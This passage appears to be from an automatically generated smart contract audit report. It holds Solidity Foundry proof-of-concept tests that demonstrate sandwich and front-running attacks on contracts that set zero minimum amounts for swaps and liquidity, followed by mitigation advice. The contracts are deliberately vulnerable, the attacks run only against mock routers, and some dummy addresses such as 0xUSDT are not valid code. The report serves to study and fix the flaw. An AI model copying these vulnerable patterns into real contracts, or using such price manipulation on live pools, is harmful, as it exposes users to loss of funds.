 This file demonstrates an educational example of a vulnerability arising from using fixed 0 values for minimum amounts 
 on liquidity and swap calls in a decentralized exchange scenario. Without slippage protection (i.e., non-zero minAmounts), 
 an attacker can manipulate the liquidity pool’s price (via large swaps) immediately prior to critical operations, 
 causing sandwich attacks or front-running. This example is for educational purposes only.
*/

// -----------------------------------
// Minimal IERC20 interface
// -----------------------------------
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

// -----------------------------------
// Minimal ERC20 token used for simulation
// -----------------------------------
contract MinimalERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    constructor(string memory _name, string memory _symbol, uint256 _supply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply;
        balanceOf[msg.sender] = _supply;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }
    
    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom( address sender, address recipient, uint256 amount ) external override returns (bool) {
        require(balanceOf[sender] >= amount, "Insufficient balance");
        require(allowance[sender][msg.sender] >= amount, "Allowance exceeded");
        balanceOf[sender] -= amount;
        allowance[sender][msg.sender] -= amount;
        balanceOf[recipient] += amount;
        return true;
    }
}

// -----------------------------------
// Minimal simulated UniswapV2Router
// -----------------------------------
contract SimulatedUniswapV2Router {
    // For the purpose of this simulation, we maintain reserves for two tokens.
    // In a real environment, these would be controlled by the liquidity pool contract.
    uint256 public reserveUSDT;
    uint256 public reserveEVE;
    
    address public USDT;
    address public EVE;
    
    constructor(address _USDT, address _EVE, uint256 _initUSDT, uint256 _initEVE) {
        USDT = _USDT;
        EVE = _EVE;
        reserveUSDT = _initUSDT;
        reserveEVE = _initEVE;
    }
    
    // Simple constant product formula with no fees
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) public pure returns (uint256) {
        require(amountIn > 0, "Invalid amountIn");
        uint256 amountInWithFee = amountIn; // No fee for simulation purposes
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn + amountInWithFee;
        return numerator / denominator;
    }
    
    // Simulated swap function for tokens.
    // For simplicity, we only simulate USDT -> EVE swap.
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 minAmountOut,
        address tokenIn,
        address tokenOut,
        address to
    ) external returns (uint256 amountOut) {
        require(tokenIn == USDT && tokenOut == EVE, "Only USDT->EVE supported in simulation");
        
        // Calculate output amount using constant product formula
        amountOut = getAmountOut(amountIn, reserveUSDT, reserveEVE);
        require(amountOut >= minAmountOut, "Insufficient output amount");
        
        // Update reserves to simulate the liquidity pool dynamics
        reserveUSDT += amountIn;
        // Prevent underflow in simulation
        require(reserveEVE > amountOut, "Not enough liquidity");
        reserveEVE -= amountOut;
        
        // In a real swap, token transfers would occur. Here we assume they are managed externally.
        // Emulate sending tokens to the recipient "to"
        // (this simulation does not actually transfer tokens)
        
        return amountOut;
    }
    
    // Simulated add liquidity function.
    // For simplicity, tokens are added directly to the reserves.
    function addLiquidity(
        uint256 amountUSDT,
        uint256 amountEVE,
        uint256 minLiquidity, // For simulation, not used
        address to
    ) external returns (uint256 liquidity) {
        // In a real router, LP tokens are minted and returned.
        // Here we simply update reserves and return a pseudo liquidity amount.
        reserveUSDT += amountUSDT;
        reserveEVE += amountEVE;
        
        liquidity = amountUSDT + amountEVE; // simplified calculation
        require(liquidity >= minLiquidity, "Insufficient liquidity added");
        return liquidity;
    }
}

// -----------------------------------
// Vulnerable contract that uses fixed 0 for minAmounts, making it vulnerable to price manipulation.
// -----------------------------------
contract VulnerableContract {
    SimulatedUniswapV2Router public router;
    IERC20 public usdt;
    IERC20 public eve;
    
    constructor(address _router, address _usdt, address _eve) {
        router = SimulatedUniswapV2Router(_router);
        usdt = IERC20(_usdt);
        eve = IERC20(_eve);
    }
    
    // Returns a simulated price from the liquidity pool (USDT per EVE).
    function getPrice() public view returns (uint256 price) {
        // For simplicity, we return reserveUSDT/reserveEVE.
        // In real situations, pricing is more complex.
        uint256 reserveUSDT = router.reserveUSDT();
        uint256 reserveEVE = router.reserveEVE();
        require(reserveEVE > 0, "No EVE tokens in reserve");
        price = reserveUSDT * (1e18) / reserveEVE;
        return price;
    }
    
    // Performs a token swap (USDT to EVE) without slippage protection (minAmount set to 0).
    function swapUSDTForTokens(uint256 amountIn) public returns (uint256 amountOut) {
        // Transfer USDT from caller to this contract before swapping
        require(usdt.transferFrom(msg.sender, address(this), amountIn), "USDT transfer failed");
        
        // Approve the router to spend USDT
        require(usdt.approve(address(router), amountIn), "Approval failed");
        
        // Call router swap with minAmount = 0 (vulnerable to slippage manipulation)
        amountOut = router.swapExactTokensForTokens(amountIn, 0, address(usdt), address(eve), address(this));
        require(amountOut > 0, "Swap failed");
        // Transfer swapped tokens to caller
        require(eve.transfer(msg.sender, amountOut), "Token transfer failed");
        return amountOut;
    }
    
    // Adds liquidity without slippage protection by using a fixed 0 for minLiquidity.
    function addLiquidity(uint256 amountUSDT, uint256 amountEVE) public returns (uint256 liquidity) {
        // Transfer tokens from caller to this contract
        require(usdt.transferFrom(msg.sender, address(this), amountUSDT), "USDT transfer failed");
        require(eve.transferFrom(msg.sender, address(this), amountEVE), "EVE transfer failed");
        
        // Approve the router to spend tokens
        require(usdt.approve(address(router), amountUSDT), "Approval failed");
        require(eve.approve(address(router), amountEVE), "Approval failed");
        
        // Call router addLiquidity with minLiquidity = 0 (vulnerable to price manipulation)
        liquidity = router.addLiquidity(amountUSDT, amountEVE, 0, address(this));
        require(liquidity > 0, "Liquidity addition failed");
        return liquidity;
    }
}

// -----------------------------------
// Foundry Test Contract demonstrating the vulnerability
// -----------------------------------
contract YourTest is BaseTestWithBalanceLog {
    // Token contracts
    MinimalERC20 usdt_token;
    MinimalERC20 eve_token;
    
    // Simulated router and vulnerable contract
    SimulatedUniswapV2Router router;
    VulnerableContract vulnerable;
    
    // Test accounts
    address user = address(0x100);
    address attacker = address(0x200);
    
    // Initial liquidity amounts for simulation
    uint256 constant initialUSDT = 1_000_000 * 1e18;
    uint256 constant initialEVE = 500_000 * 1e18;
    
    function setUp() public {
        // Ensure the test contract has enough ETH for operations
        vm.deal(address(this), 100 ether);
        
        // Deploy tokens with large initial supplies to the deployer (msg.sender)
        usdt_token = new MinimalERC20("USDT Token", "USDT", 10_000_000 * 1e18);
        eve_token = new MinimalERC20("EVE Token", "EVE", 10_000_000 * 1e18);
        
        // Allocate tokens to user and attacker
        usdt_token.transfer(user, 100_000 * 1e18);
        usdt_token.transfer(attacker, 100_000 * 1e18);
        eve_token.transfer(user, 50_000 * 1e18);
        eve_token.transfer(attacker, 50_000 * 1e18);
        
        // Deploy the simulated Uniswap router with initial liquidity pool setup
        router = new SimulatedUniswapV2Router(
            address(usdt_token),
            address(eve_token),
            initialUSDT,
            initialEVE
        );
        
        // Deploy vulnerable contract that interacts with our simulated router
        vulnerable = new VulnerableContract(address(router), address(usdt_token), address(eve_token));
        
        // Approvals for the test contract to simulate user actions (using cheat codes)
        // In a real test, we would simulate this by using vm.prank or similar techniques.
        // For simplicity, we assume user and attacker have approved the vulnerable contract.
        vm.prank(user);
        usdt_token.approve(address(vulnerable), type(uint256).max);
        vm.prank(user);
        eve_token.approve(address(vulnerable), type(uint256).max);
        
        vm.prank(attacker);
        usdt_token.approve(address(router), type(uint256).max);
    }
    
    // Test function to demonstrate the vulnerability.
    // Note: balanceLog modifier logs ETH balances on function call.
    function testExploit() public balanceLog {
        // Ensure this test contract has enough ETH for operations
        vm.deal(address(this), 10 ether);
        
        // Step 1: Demonstrate normal behavior:
        //    - Get token price from the liquidity pool.
        uint256 initialPrice = vulnerable.getPrice();
        emit log_named_uint("Initial Price (USDT per EVE) * 1e18", initialPrice);
        
        //    - User performs a token swap with the vulnerable contract.
        uint256 swapAmount = 1_000 * 1e18;
        // Simulate caller as 'user'
        vm.prank(user);
        uint256 tokensReceived = vulnerable.swapUSDTForTokens(swapAmount);
        emit log_named_uint("Tokens received from swap (normal)", tokensReceived);
        
        //    - User adds liquidity via the vulnerable contract.
        uint256 addUSDT = 500 * 1e18;
        uint256 addEVE = 250 * 1e18;
        vm.prank(user);
        uint256 liquidityAdded = vulnerable.addLiquidity(addUSDT, addEVE);
        emit log_named_uint("Liquidity added (normal)", liquidityAdded);
        
        // Step 2: Simulate attack:
        // Attacker performs a significant swap directly on the router to manipulate the pool price.
        // The attacker uses his own USDT tokens to heavily impact the USDT/EVE ratio.
        uint256 attackerSwapAmount = 50_000 * 1e18;
        vm.prank(attacker);
        uint256 attackerTokensReceived = router.swapExactTokensForTokens(
            attackerSwapAmount,
            0, // No slippage protection, allowing the manipulation
            address(usdt_token),
            address(eve_token),
            attacker
        );
        emit log_named_uint("Attacker tokens received from swap", attackerTokensReceived);
        
        // Check the manipulated price after the attacker's swap.
        uint256 manipulatedPrice = vulnerable.getPrice();
        emit log_named_uint("Manipulated Price (USDT per EVE) * 1e18", manipulatedPrice);
        
        // Vulnerability Explanation:
        // The vulnerable contract uses fixed 0 values for minimum output amounts when calling the router's swap and addLiquidity functions.
        // This means that even when an attacker manipulates the liquidity pool by executing a large swap (thus changing the price unfavorably),
        // the vulnerable contract does not enforce any slippage protection. The attacker can manipulate the pool price between when the price is obtained
        // and when the vulnerable contract executes its swap or liquidity addition, leading to potential losses for the user.
        
        // Mitigation Measure (Educational):
        // Developers should avoid using fixed 0 values for minAmount parameters. Instead, they should:
        // 1. Calculate expected output amounts based on current market conditions.
        // 2. Set a reasonable minimum amount (e.g., 95-98% of the expected output) to protect against slippage.
        // 3. Incorporate checks that verify current pool conditions before executing critical token swaps or liquidity operations.
    }
}
```

---

### PoC #3: no_slippage_limit_check

**File:** /Users/advait/Desktop/NTU/fyp-fr/exploit/src/test/PoC_unknown_1742753761.sol

**Execution:** ✅ SUCCESS

**Exploit Code:**

```solidity
pragma solidity ^0.8.13;

// Import Foundry BaseTest with balance logging
import "./basetest.sol";

/// @title IUniswapV2Router Interface
/// @notice Defines the minimal functions for the mock UniswapV2Router contract used in the demo.
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin, // Insecure: using zero as minimum acceptable
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin, // Insecure: using zero as minimum acceptable
        uint256 amountBMin, // Insecure: using zero as minimum acceptable
        address to,
        uint256 deadline
    ) external returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );
}

/// @title MockUniswapV2Router
/// @notice A simplified mock of UniswapV2Router to simulate swap and liquidity behavior, including manipulated market conditions.
contract MockUniswapV2Router is IUniswapV2Router {
    // flag to simulate front-running/manipulation
    bool public manipulated;

    // Allow external control to simulate market manipulation for educational purposes.
    function setManipulated(bool _manipulated) external {
        manipulated = _manipulated;
    }

    /// @notice Simulate a token swap.
    /// @dev When not manipulated, returns favorable rate. When manipulated, returns an unexpectedly low output.
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 /* amountOutMin */,
        address[] calldata /* path */,
        address to,
        uint256 /* deadline */
    ) external override returns (uint256[] memory amounts) {
        uint256 output;
        if (!manipulated) {
            // Normal market conditions: favorable rate (for demo purposes, double the tokens)
            output = amountIn * 2;
        } else {
            // Front-running scenario: manipulated market conditions lead to a very low output.
            output = amountIn / 100; // adverse rate
        }
        // For demonstration, log the transfer to 'to'
        // In a real scenario, token transfers would happen here.
        amounts = new uint256[](2);
        amounts[0] = amountIn;
        amounts[1] = output;
        // Ensure the call does not fail; returns output amounts.
        return amounts;
    }

    /// @notice Simulate adding liquidity.
    /// @dev When not manipulated, returns expected liquidity tokens. When manipulated, returns a diminished liquidity amount.
    function addLiquidity(
        address /* tokenA */,
        address /* tokenB */,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 /* amountAMin */,
        uint256 /* amountBMin */,
        address to,
        uint256 /* deadline */
    ) external override returns (uint256 amountA, uint256 amountB, uint256 liquidity) {
        if (!manipulated) {
            // Normal liquidity addition: expect a 1:1 ratio for liquidity tokens (for demo purposes)
            liquidity = amountADesired < amountBDesired ? amountADesired : amountBDesired;
        } else {
            // Manipulated scenario: liquidity tokens drastically reduced due to front-running effects.
            liquidity = (amountADesired < amountBDesired ? amountADesired : amountBDesired) / 10;
        }
        // For demonstration, the tokens are "sent" to the address 'to'
        return (amountADesired, amountBDesired, liquidity);
    }
}

/// @title VulnerableContract
/// @notice A simplified vulnerable contract that interacts with Uniswap-like contracts without slippage protection.
/// @dev This contract demonstrates the improper use of minimum output amounts (set to zero) during swaps and liquidity addition.
contract VulnerableContract {
    IUniswapV2Router public router;
    
    // For demonstration, we simulate token balances as simple uint256 values.
    uint256 public usdtBalance;
    uint256 public tokenBalance;

    /// @notice Initializes the contract with the Uniswap router address.
    constructor(IUniswapV2Router _router) {
        router = _router;
        // For demo, initialize with some balances.
        usdtBalance = 1000 ether;
        tokenBalance = 1000 ether;
    }

    /// @notice Performs a token swap from USDT to Tokens.
    /// @dev Vulnerable: Uses a zero minimum expected token output, enabling unfavorable swaps during manipulation.
    function swapUSDTForTokens(uint256 amountIn) external returns (uint256[] memory amounts) {
        require(amountIn <= usdtBalance, "Insufficient USDT balance");

        // For demo, prepare parameters for swap on the router.
        address[] memory path = new address[](2);
        path[0] = address(0xUSDT);  // Dummy USDT address for demonstration purposes
        path[1] = address(0xToken); // Dummy token address

        // Vulnerable: minimum output is set to zero (no slippage protection)
        uint256 amountOutMin = 0;
        uint256 deadline = block.timestamp + 1 minutes;

        // Call the router's swap function and check the returned amounts.
        amounts = router.swapExactTokensForTokens(amountIn, amountOutMin, path, address(this), deadline);
        require(amounts.length >= 2, "Swap failed");

        // Update balances for demonstration.
        usdtBalance -= amountIn;
        tokenBalance += amounts[1];

        return amounts;
    }

    /// @notice Adds liquidity using USDT and Tokens.
    /// @dev Vulnerable: Uses zero minimum expected amounts for both tokens.
    function addLiquidity(uint256 usdtAmount, uint256 tokenAmount) external returns (uint256 liquidity) {
        require(usdtAmount <= usdtBalance, "Insufficient USDT balance");
        require(tokenAmount <= tokenBalance, "Insufficient token balance");

        uint256 amountAMin = 0; // Vulnerable: no minimum amounts
        uint256 amountBMin = 0;
        uint256 deadline = block.timestamp + 1 minutes;

        (uint256 amountA, uint256 amountB, uint256 liq) = router.addLiquidity(
            address(0xUSDT),  // Dummy USDT address
            address(0xToken), // Dummy token address
            usdtAmount,
            tokenAmount,
            amountAMin,
            amountBMin,
            address(this),
            deadline
        );
        require(liq > 0, "Liquidity addition failed");

        // Update balances for demonstration.
        usdtBalance -= amountA;
        tokenBalance -= amountB;

        liquidity = liq;
    }
}

/// @title YourTest
/// @notice A Foundry test contract that demonstrates an educational exploitation of a vulnerability due to lack of slippage protection.
/// @dev This is for educational purposes. It shows how using zero minimum amounts in token swaps and liquidity additions can be dangerous.
contract YourTest is BaseTestWithBalanceLog {
    VulnerableContract vulnerable;
    MockUniswapV2Router mockRouter;

    // Setup test environment with sufficient ETH for execution.
    function setUp() public {
        // The test contract must have enough ETH
        vm.deal(address(this), 100 ether);

        // Deploy the mock UniswapV2Router
        mockRouter = new MockUniswapV2Router();

        // Deploy the vulnerable contract with the router's address.
        vulnerable = new VulnerableContract(IUniswapV2Router(address(mockRouter)));
    }

    // Main test demonstrating the vulnerability exploitation.
    // The balanceLog modifier ensures balance changes are logged.
    function testExploit() public balanceLog {
        // Ensure the test contract has enough ETH before proceeding.
        vm.deal(address(this), 10 ether);

        // -----------------------------
        // Step 1: Normal operation
        // -----------------------------
        // Perform a normal swap and liquidity addition with no price manipulation.
        uint256 initialTokenBalance = vulnerable.tokenBalance();

        // Normal swap: swap 100 USDT for tokens.
        uint256 swapAmount = 100 ether;
        uint256[] memory amountsNormal = vulnerable.swapUSDTForTokens(swapAmount);
        require(amountsNormal[1] > swapAmount, "Normal swap should yield more tokens");

        // Normal liquidity addition: add liquidity with balanced amounts.
        uint256 liquidityNormal = vulnerable.addLiquidity(50 ether, 50 ether);
        require(liquidityNormal > 0, "Normal liquidity addition failed");

        // -----------------------------
        // Step 2: Simulate front-running attack (price manipulation)
        // -----------------------------
        // A malicious actor manipulates market conditions.
        // For simulation, we set the manipulated flag in the mock router.
        mockRouter.setManipulated(true);

        // The attacker/front-runner doesn't need to do anything other than force market conditions,
        // because the vulnerable contract uses zero minimum amounts.
        // Victim performs a swap unaware of the manipulation.
        uint256 swapAmountFrontRun = 100 ether;
        uint256[] memory amountsManipulated = vulnerable.swapUSDTForTokens(swapAmountFrontRun);

        // Check that the output token amount is drastically lower due to manipulation.
        require(amountsManipulated[1] < (swapAmountFrontRun * 2), "Swap output not affected by manipulation");

        // Similarly, adding liquidity will produce significantly reduced liquidity tokens.
        uint256 liquidityManipulated = vulnerable.addLiquidity(50 ether, 50 ether);
        require(liquidityManipulated < 50 ether, "Liquidity addition not affected by manipulation");

        // -----------------------------
        // Educational Comments:
        // -----------------------------
        // The vulnerability arises from the absence of slippage protection, as the vulnerable contract sets
        // the minimum acceptable amounts to zero in both swap and liquidity addition functions.
        // This allows a malicious actor to manipulate the market conditions (front-run) between transaction
        // initiation and execution, leading to highly unfavorable exchange rates and liquidity addition.
        //
        // To prevent this issue, developers should set non-zero minimum acceptable amounts based on current market
        // conditions and acceptable slippage thresholds. For example:
        // - Calculate expected outputs and subtract a tolerance (e.g., 1%) to set as the minimum
        // - Use oracle data or on-chain price feeds to validate trade parameters
        //
        // This educational test demonstrates both the vulnerability and a suggested mitigation approach.
    }
}
```

---

## Recommendations

For each identified vulnerability, consider implementing the following mitigations:

- **For Reentrancy**: Implement checks-effects-interactions pattern and consider using ReentrancyGuard.
- **For Arithmetic Issues**: Use SafeMath library or Solidity 0.8.x built-in overflow checking.
- **For Access Control**: Implement proper authorization checks and use the Ownable pattern.
- **For Oracle Manipulation**: Use time-weighted average prices and multiple independent oracle sources.
- **For All Vulnerabilities**: Consider a professional audit before deploying to production.

*This report was generated automatically by the Smart Contract Vulnerability Analyzer.*
